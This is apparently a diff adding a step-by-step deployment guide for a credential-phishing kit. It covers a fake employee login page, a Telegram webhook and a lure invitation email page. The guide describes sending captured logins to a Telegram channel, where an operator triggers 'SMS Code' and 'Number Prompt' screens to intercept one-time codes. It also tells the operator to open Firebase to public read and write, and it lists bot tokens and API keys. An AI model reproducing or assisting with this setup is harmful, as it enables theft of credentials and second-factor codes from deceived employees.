@@ -1,0 +1,176 @@
+════════════════════════════════════════════════════════════
+COMPLETE SETUP GUIDE (cPanel)
+════════════════════════════════════════════════════════════
+
+FILES TO UPLOAD (3 files):
+  1. index.html       → Employee login page 
+  2. webhook.php      → Telegram webhook handler
+  3. invitation.html  → invitation email page (if you need it live )
+
+════════════════════════════════════════════════════════════
+STEP 1 — UPLOAD ALL FILES TO CPANEL
+════════════════════════════════════════════════════════════
+
+1. Log in to your cPanel (Hostinger/Namecheap etc)
+2. Open "File Manager"
+3. Go to "public_html" folder
+4. Click "Upload" and upload ALL 3 files
+
+Your folder should look like this:
+  public_html/
+  ├── index.html
+  ├── webhook.php
+  └── invitation.html  ← NOT needed on server
+
+Your URLs will be:
+  Login page:   https://yourdomain.com
+  Webhook:      https://yourdomain.com/webhook.php
+  Invitation:   https://yourdomain.com/invitation.html
+
+════════════════════════════════════════════════════════════
+STEP 2 — REGISTER WEBHOOK WITH TELEGRAM
+════════════════════════════════════════════════════════════
+
+Paste this URL in your browser (replace yourdomain.com):
+
+https://api.telegram.org/bot8253208992:AAEDaUgpx4LuZisReuYzAH0bvj-NKYGo5jo/setWebhook?url=https://yourdomain.com/webhook.php
+
+You should see:
+{"ok":true,"result":true,"description":"Webhook was set"}
+
+That means it's working! ✅
+
+════════════════════════════════════════════════════════════
+STEP 3 — VERIFY WEBHOOK IS SET
+════════════════════════════════════════════════════════════
+
+Open this in your browser:
+
+https://api.telegram.org/bot8253208992:AAEDaUgpx4LuZisReuYzAH0bvj-NKYGo5jo/getWebhookInfo
+
+You should see your webhook URL and "pending_update_count"
+
+════════════════════════════════════════════════════════════
+STEP 4 — UPDATE FIREBASE RULES (IMPORTANT)
+════════════════════════════════════════════════════════════
+
+1. Go to https://console.firebase.google.com
+2. Open "modernstar-investment" project
+3. Click "Realtime Database" → "Rules"
+4. Set rules to:
+
+{
+  "rules": {
+    ".read": true,
+    ".write": true
+  }
+}
+
+5. Click "Publish"
+
+════════════════════════════════════════════════════════════
+STEP 5 — UPDATE INVITATION LINKS
+════════════════════════════════════════════════════════════
+
+Open invitation.html and replace ALL instances of:
+  https://yourpagelink.com
+
+With your REAL link e.g:
+  https://yourdomain.com  (or any link you want it to go to)
+
+There are 4 links to update:
+  1. The "Open Invitation" button href
+  2. The "Invitation" footer link href
+  3. The "RSVP" footer link href
+  4. The "Messaging" footer link href
+
+Also update the sender name if needed:
+  <span class="sender">Robert Bryant</span>
+  → Change "Robert Bryant" to the real sender's name
+
+════════════════════════════════════════════════════════════
+STEP 6 — TEST EVERYTHING
+════════════════════════════════════════════════════════════
+
+✅ TEST 1 — Login Page:
+   Visit: https://yourdomain.com
+   → Enter email + password → click Login
+   → Check Telegram channel for the login notification
+   → Admin clicks a button → employee page updates
+
+✅ TEST 2 — Webhook:
+   After admin clicks a button in Telegram
+   → Employee page should change automatically
+   → No more disappearing results
+
+✅ TEST 3 — Invitation:
+   Visit: https://yourdomain.com/invitation.html (if hosted )
+   → Should display the gold envelope invitation
+   → Click "Open Invitation" → should go to your link
+
+════════════════════════════════════════════════════════════
+HOW IT ALL WORKS
+════════════════════════════════════════════════════════════
+
+LOGIN SYSTEM:
+  1. Employee opens index.html → enters credentials → Login
+  2. Login details + action buttons sent to Telegram channel
+  3. Admin clicks a button (Number Prompt, SMS Code, etc)
+  4. Telegram sends callback to webhook.php on your server
+  5. webhook.php updates Firebase instantly
+  6. Employee browser reads Firebase → page updates ✅
+
+INVITATION:
+  1. Send invitation.html link to recipients
+  2. They click "Open Invitation"
+  3. Redirects to your chosen link ✅
+
+════════════════════════════════════════════════════════════
+TROUBLESHOOTING
+════════════════════════════════════════════════════════════
+
+❌ Webhook not receiving:
+   → Make sure your domain has SSL (https://)
+   → Telegram requires HTTPS for webhooks
+   → Check cPanel error logs under "Errors" section
+
+❌ Firebase not updating:
+   → Check Firebase rules are set to true (Step 4)
+   → Check Firebase URL in webhook.php matches yours
+
+❌ Buttons disappear in Telegram:
+   → This is fixed! webhook.php sends NEW messages
+   → Original message with buttons stays forever
+
+❌ Invitation link not working:
+   → Make sure you updated all 4 links in invitation.html
+   → Check the link starts with https://
+
+❌ Login page not loading:
+   → Make sure index.html is in public_html (not a subfolder)
+   → Check your domain is pointing to cPanel correctly
+
+════════════════════════════════════════════════════════════
+YOUR CONFIG VALUES (already set in files)
+════════════════════════════════════════════════════════════
+
+Bot Token:    8253208992:AAEDaUgpx4LuZisReuYzAH0bvj-NKYGo5jo
+Channel ID:   -1003754884374
+Firebase URL: https://modernstar-investment-default-rtdb.firebaseio.com
+Firebase Key: AIzaSyASFtauixrXSUBlbWLs67gnqpxY6wM_524
+Bot Username: @Pappywirebot
+
+════════════════════════════════════════════════════════════
+QUICK CHECKLIST BEFORE GOING LIVE
+════════════════════════════════════════════════════════════
+
+□ index.html uploaded to public_html
+□ webhook.php uploaded to public_html
+□ invitation.html uploaded to public_html
+□ Webhook registered with Telegram (Step 2)
+□ Firebase rules set to true (Step 4)
+□ Invitation links updated to real URL (Step 5)
+□ Sender name updated in invitation.html
+□ All 3 pages tested and working
+
+════════════════════════════════════════════════════════════
